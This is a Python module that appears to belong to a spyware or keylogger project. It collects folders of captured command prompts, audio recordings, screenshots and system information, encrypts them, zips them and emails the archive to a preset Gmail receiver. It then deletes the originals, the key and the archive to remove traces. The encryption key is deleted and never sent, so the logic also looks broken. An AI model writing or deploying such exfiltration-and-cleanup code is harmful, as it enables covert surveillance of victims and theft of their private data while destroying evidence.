# Built-in modules
import os
import time
import zipfile
import shutil

# External libraries
from cryptography.fernet import Fernet

# Custom modules
import Util.DataClass as Data_Class
import Util.SendMail as SendMail


class FileEncryption(Data_Class):
    def __init__(self):
        self.baseclass = Data_Class.BaseClass.__init__(self)  # Call the base class __init__ method
        self.SendMail = SendMail.SendMail

        # Constants
        self.key_path = 'FileKey.key'
        self.zip_file_path = 'Encrypted_Folders.zip'
        self.encrypted_folders_dir = 'Encrypted_Folders'

        # Folders in a list
        self.folders = [
            self.baseclass.folder_path_cmd_prompts,
            self.baseclass.folder_path_recordings,
            self.baseclass.folder_path_screenshots,
            self.baseclass.folder_path_soundfile,
            self.baseclass.folder_path_sys_info
        ]

        self.base_folder = os.path.dirname(os.path.commonprefix(self.folders))

        # Load config settings - sender and receiver
        self.gmail_address_sender = self.baseclass.gmail_address_sender
        self.gmail_address_receiver = self.baseclass.gmail_address_receiver

    def generate_key(self):
        key = Fernet.generate_key()

        # String key in a file
        with open(self.key_path, 'wb') as f:
            f.write(key)

    def encrypt_folder(self, folder_path):
        # Read the encryption key
        with open(self.key_path, 'rb') as f:
            key = f.read()

        fernet = Fernet(key)

        # Get the relative path to the folder from the base folder
        rel_folder_path = os.path.relpath(folder_path, self.base_folder)

        # Create the corresponding encrypted folder path inside "Encrypted_Folders"
        encrypted_folder_path = os.path.join(self.encrypted_folders_dir, rel_folder_path)

        # Copy the original folder to the encrypted folder
        shutil.copytree(folder_path, encrypted_folder_path)

        # Iterate through the files in the folder
        for root, _, files in os.walk(encrypted_folder_path):
            for file in files:
                file_path = os.path.join(root, file)

                if not file_path.endswith('.py'):
                    # Read the original file content
                    with open(file_path, 'rb') as f:
                        org_content = f.read()

                    # Encrypt the file content
                    encrypted_content = fernet.encrypt(org_content)

                    # Save the encrypted content back to the file
                    with open(file_path, 'wb') as f:
                        f.write(encrypted_content)

    def encrypt_folders(self):
        # Generate key
        self.generate_key()

        # Create the "encrypted_folders" directory if it doesn't exist
        os.makedirs(self.encrypted_folders_dir, exist_ok=True)

        for folder in self.folders:
            if os.path.exists(folder):
                self.encrypt_folder(folder)

        # Zip the "encrypted_folders" directory
        with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for root, _, files in os.walk(self.encrypted_folders_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))

        # Send the email with the ZIP file as an attachment
        mailer = self.SendMail
        mailer.sender_mail = self.gmail_address_sender  # Set your own Gmail address
        mailer.receiver_mail = self.gmail_address_receiver  # Set your own Gmail address
        mailer.send_mail(self, self.zip_file_path)

        time.sleep(10)

        self.delete_files()

    def delete_files(self):
        # Delete all the original folders
        for folder in self.folders:
            shutil.rmtree(folder)

        # Delete the encrypted folders directory
        shutil.rmtree(self.encrypted_folders_dir)

        # Delete the key file
        os.remove(self.key_path)

        # Delete the zip file
        os.remove(self.zip_file_path)
